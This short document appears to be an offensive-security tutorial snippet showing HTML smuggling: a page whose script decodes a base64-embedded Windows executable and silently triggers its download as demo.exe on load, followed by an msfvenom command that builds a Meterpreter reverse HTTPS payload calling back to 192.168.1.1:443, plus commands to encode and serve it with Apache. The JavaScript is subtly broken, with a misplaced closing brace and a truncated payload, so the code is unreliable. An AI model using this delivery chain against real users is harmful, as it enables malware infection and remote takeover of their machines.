**HTML FILE EXAMPLE OF A DELIVERY THOURGH HTML SMUGGLING:**

```
<html>
  <body>
    <script>
      function base64ToArrayBuffer(base64) {
      var binary_string = window.atob(base64);
      var len = binary_string.length;
      var bytes = new Uint8Array( len );
      for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i);
}
      }
      return bytes.buffer;
      var file ='TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAA...
      var data = base64ToArrayBuffer(file);
      var blob = new Blob([data], {type: 'octet/stream'});
      var fileName = 'demo.exe';
      var a = document.createElement('a');
      document.body.appendChild(a);
      a.style = 'display: none';
      var url = window.URL.createObjectURL(blob);
      a.href = url;
      a.download = fileName;
      a.click();
      window.URL.revokeObjectURL(url);
    </script>
  </body>
</html>

```

The basae64 payload is:

```
~# msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=443 -f exe -o /var/www/html/demo.exe

~# base64 /var/www/html/demo.exe
```

Then start the apache2 service:

```
~# service apache2 start
```
